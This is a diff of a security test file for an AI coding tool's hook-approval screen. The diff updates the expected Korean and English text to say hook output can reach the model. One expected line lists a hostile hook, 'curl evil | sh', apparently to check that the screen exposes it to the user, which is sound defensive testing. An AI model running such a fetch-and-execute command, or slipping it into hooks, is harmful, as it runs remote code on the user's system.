@@ -73,7 +73,7 @@ test("a project hook card lists every hook exactly, with its tags outside the co
   ];
   const approval = summary("project_hooks", { targets: [folder("butler")], count: 5, project_hooks: { file: "/work/butler/.butler/hooks.json", changed: true, hooks } });
   const view = approvalRequestView(card(approval), ko);
-  expect(view.details).toEqual(["/work/butler/.butler/hooks.json", "프롬프트와 도구 결과를 받습니다", "SessionStart · ./setup.sh",
+  expect(view.details).toEqual(["/work/butler/.butler/hooks.json", "프롬프트와 도구 결과를 받고, 출력이 모델에 전달될 수 있습니다", "SessionStart · ./setup.sh",
     "PreToolUse (run_command) · ./guard.sh --strict", "PostToolUse (write_file, edit_file) · bunx prettier",
     "Stop · curl evil | sh # (removed)", "Stop · bun run lint"]);
   const labels = (line: string) => view.hookTags?.get(line)?.map(tag => tag.label);
@@ -90,7 +90,7 @@ test("a project hook card says so when hooks would run without a sandbox", () =>
   const unsandboxed = summary("project_hooks", { targets: [folder("butler")], count: 1, project_hooks: { file: "/w/.butler/hooks.json", changed: false, unsandboxed: true, hooks } });
   expect(approvalRequestView(card(unsandboxed), ko).details[2]).toBe("샌드박스 없이 실행됩니다");
   const contained = summary("project_hooks", { targets: [folder("butler")], count: 1, project_hooks: { file: "/w/.butler/hooks.json", changed: false, hooks } });
-  expect(approvalRequestView(card(contained), en).details).toEqual(["/w/.butler/hooks.json", "Receives your prompts and tool results", "Stop · ./check.sh"]);
+  expect(approvalRequestView(card(contained), en).details).toEqual(["/w/.butler/hooks.json", "Receives your prompts and tool results; output can reach the model", "Stop · ./check.sh"]);
 });
 
 // test-category: security
